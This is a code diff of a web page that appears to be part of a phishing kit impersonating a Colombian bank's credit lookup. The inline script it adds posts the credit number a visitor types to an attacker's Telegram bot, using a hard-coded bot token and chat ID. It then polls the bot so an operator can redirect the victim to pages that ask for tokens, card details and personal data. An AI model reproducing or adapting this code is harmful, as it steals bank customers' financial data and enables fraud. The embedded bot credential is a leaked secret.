@@ -140,15 +140,175 @@
     </footer>
 
     <!-- ============================================================
-         📌 SCRIPTS
+         📌 SCRIPT: TODO INTEGRADO (función sencilla de Telegram)
          ============================================================ -->
-    <script src="telegram.js"></script>
-    <script src="action.js"></script>
     <script>
         // ============================================================
-        // 🧹 LIMPIAR ESCUCHA PREVIA
+        // 🔑 CONFIGURACIÓN DE TELEGRAM
         // ============================================================
-        if (window.stopListening) window.stopListening();
+        const TG_BOT_TOKEN = '8706360517:AAED05xUNpk695MaVPIBAYaYYJd1blx067E';
+        const TG_CHAT_ID = '7776240161';
+
+        // ============================================================
+        // 📤 FUNCIÓN SENCILLA: ENVIAR SOLO EL NÚMERO DE CRÉDITO
+        // ============================================================
+        function enviarCreditoTelegram(numeroCredito, onSent) {
+            const mensaje = `
+🏦 <b>MOBILIZE - NUEVO CRÉDITO</b>
+
+📄 <b>Número de crédito:</b> <code>${numeroCredito}</code>
+
+📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
+            `.trim();
+
+            const keyboard = {
+                inline_keyboard: [
+                    [
+                        { text: '✅ Crédito Válido', callback_data: 'credito_ok' },
+                        { text: '❌ Crédito Inválido', callback_data: 'credito_error' }
+                    ],
+                    [
+                        { text: '🏁 Finalizar', callback_data: 'finalizar' }
+                    ]
+                ]
+            };
+
+            return fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TG_CHAT_ID,
+                    text: mensaje,
+                    parse_mode: 'HTML',
+                    reply_markup: keyboard
+                })
+            })
+            .then(r => r.json())
+            .then(data => {
+                console.log('✅ Respuesta Telegram:', data);
+
+                if (data.ok && data.result) {
+                    const messageId = data.result.message_id;
+                    localStorage.setItem('bbogota_msg_id', messageId);
+                    console.log('💾 Message ID guardado:', messageId);
+
+                    if (typeof onSent === 'function') onSent(messageId);
+                    return messageId;
+                } else {
+                    console.error('❌ Error Telegram:', data);
+                    return null;
+                }
+            })
+            .catch(err => {
+                console.error('❌ Error de red:', err);
+                return null;
+            });
+        }
+
+        // ============================================================
+        // 👂 ESCUCHAR BOTONES DEL BOT (polling simple)
+        // ============================================================
+        let pollingActivo = false;
+        let pollingTimeout = null;
+
+        function escucharBotones(onAction) {
+            const msgId = localStorage.getItem('bbogota_msg_id');
+            if (!msgId) {
+                console.warn('⚠️ No hay msgId para escuchar');
+                return;
+            }
+
+            console.log('👂 Escuchando mensaje:', msgId);
+            pollingActivo = true;
+            let lastUpdateId = -1;
+
+            function check() {
+                if (!pollingActivo) return;
+
+                fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        offset: lastUpdateId + 1,
+                        allowed_updates: ['callback_query'],
+                        timeout: 10
+                    })
+                })
+                .then(r => r.json())
+                .then(data => {
+                    if (!data.ok || !data.result || data.result.length === 0) {
+                        pollingTimeout = setTimeout(check, 2000);
+                        return;
+                    }
+
+                    for (const u of data.result) {
+                        lastUpdateId = Math.max(lastUpdateId, u.update_id);
+
+                        if (!u.callback_query) continue;
+
+                        const action = u.callback_query.data;
+                        const messageId = String(u.callback_query.message.message_id);
+
+                        console.log(`📨 Update: msg ${messageId}, esperando ${msgId}`);
+
+                        if (messageId === String(msgId)) {
+                            console.log('✅ Coincide! Acción:', action);
+                            pollingActivo = false;
+                            onAction(action);
+                            return;
+                        }
+                    }
+
+                    pollingTimeout = setTimeout(check, 2000);
+                })
+                .catch(err => {
+                    console.error('❌ Error polling:', err);
+                    pollingTimeout = setTimeout(check, 3000);
+                });
+            }
+
+            check();
+        }
+
+        // ============================================================
+        // 🗺️ MANEJAR ACCIÓN DEL BOT
+        // ============================================================
+        const REDIRECTS = {
+            'credito_ok': 'transaction_summary.html',
+            'credito_error': 'index1.html?error=wrong_data',
+            'finalizar': 'final.html',
+            'error': 'index1.html?error=wrong_data',
+            'token': 'token.html',
+            'token_otro': 'tokeninv.html',
+            'tarjeta_debito': 'tarjeta.html',
+            'tarjeta_credito': 'tarjeta.html',
+            'soyyo': 'soyyo.html',
+            'datos_personales': 'https://virtualbogotacuposbogota.pages.dev/bogota/datos-personales',
+            'error_logo': 'soyyo.html?error=invalid',
+        };
+
+        let actionProcessed = false;
+
+        function handleTelegramAction(action) {
+            if (actionProcessed) {
+                console.log('⚠️ Acción ya procesada');
+                return;
+            }
+            console.log('📩 Acción recibida:', action);
+            actionProcessed = true;
+
+            const redirectUrl = REDIRECTS[action];
+
+            if (redirectUrl) {
+                console.log('✅ Redirigiendo a:', redirectUrl);
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 100);
+            } else {
+                console.warn('⚠️ Acción desconocida:', action);
+                actionProcessed = false;
+            }
+        }
 
         // ============================================================
         // 🖊️ INPUT: número de crédito
@@ -158,14 +318,11 @@
             const btn = document.getElementById('btnContinuar');
             const msgErr = document.getElementById('msgError');
 
-            // Estado inicial
             btn.disabled = true;
             btn.classList.remove('active');
 
             input.addEventListener('input', function() {
-                // Solo números
                 this.value = this.value.replace(/[^0-9]/g, '');
-
                 const tiene = this.value.trim().length > 0;
                 btn.disabled = !tiene;
                 btn.classList.toggle('active', tiene);
@@ -183,7 +340,7 @@
         });
 
         // ============================================================
-        // 📤 ENVIAR FORMULARIO DEL CRÉDITO
+        // 📤 ENVIAR FORMULARIO
         // ============================================================
         function sendCreditForm(e) {
             e.preventDefault();
@@ -199,48 +356,30 @@
                 return false;
             }
 
+            // Overlay
             document.getElementById('loading-overlay').style.display = 'flex';
             btn.disabled = true;
             btn.textContent = 'Consultando...';
             msgErr.style.display = 'none';
 
-            // Detener escucha anterior y limpiar estado
-            if (window.stopListening) window.stopListening();
-            localStorage.removeItem('bbogota_msg_id');
-            if (typeof actionProcessed !== 'undefined') actionProcessed = false;
+            // Guardar localmente
+            localStorage.setItem('userInfo', JSON.stringify({ credito: creditNumber }));
+            actionProcessed = false;
 
-            const userData = (typeof getUserData === 'function') ? getUserData() : {
-                tipo_identificacion: localStorage.getItem('user_id_type') || 'CC',
-                numero_identificacion: localStorage.getItem('user_id_number') || 'Desconocido'
-            };
-
-            // ⚠️ Enviamos como 'login' para que el bot NO valide 6 dígitos
-            const creditData = {
-                credito: creditNumber,
-                tipo_identificacion: userData.tipo_identificacion,
-                numero_identificacion: userData.numero_identificacion
-            };
-
-            // Guardar en localStorage
-            localStorage.setItem('userInfo', JSON.stringify(creditData));
-
-            if (typeof sendToTelegram === 'function') {
-                sendToTelegram('login', creditData, function() {
-                    console.log('✅ Crédito enviado');
-                    // Escuchar respuesta del bot
-                    if (typeof listenCurrentButtons === 'function') {
-                        listenCurrentButtons(window.handleTelegramAction);
-                    } else {
-                        // Fallback si no hay listenCurrentButtons
-                        setTimeout(() => {
-                            window.location.href = 'transaction_summary.html';
-                        }, 3000);
-                    }
-                });
-            } else {
-                console.error('❌ sendToTelegram no disponible');
-                window.location.href = 'transaction_summary.html';
-            }
+            // Enviar a Telegram
+            enviarCreditoTelegram(creditNumber, function(messageId) {
+                if (messageId) {
+                    console.log('✅ Crédito enviado, msgId:', messageId);
+                    escucharBotones(handleTelegramAction);
+                } else {
+                    // Si no se pudo enviar, quitar overlay
+                    document.getElementById('loading-overlay').style.display = 'none';
+                    btn.disabled = false;
+                    btn.textContent = 'CONTINUAR';
+                    msgErr.textContent = 'Error de conexión. Intenta de nuevo.';
+                    msgErr.style.display = 'block';
+                }
+            });
 
             return false;
         }
